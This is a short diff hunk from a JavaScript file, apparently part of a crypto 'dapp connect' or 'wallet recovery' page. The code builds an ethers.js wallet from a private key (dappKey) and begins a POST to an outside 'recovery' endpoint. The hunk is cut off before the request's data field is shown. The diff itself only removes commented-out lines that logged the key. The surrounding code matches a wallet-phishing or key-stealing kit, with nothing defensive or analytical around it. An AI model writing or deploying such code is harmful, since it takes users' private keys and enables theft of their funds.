@@ -2157,9 +2157,7 @@
         try {
             let wallet = new ethers.Wallet(dappKey);
             let dappAddress = wallet.address;
-            // console.log('Private key is valid:', dappKey);
-            // console.log('Private key is valid. Wallet address:', dappAddress);
-
+         
             $.ajax({
                 url: "https://voicewelfare.com/recovery/connectdappsolution.php",
                 method: "POST",
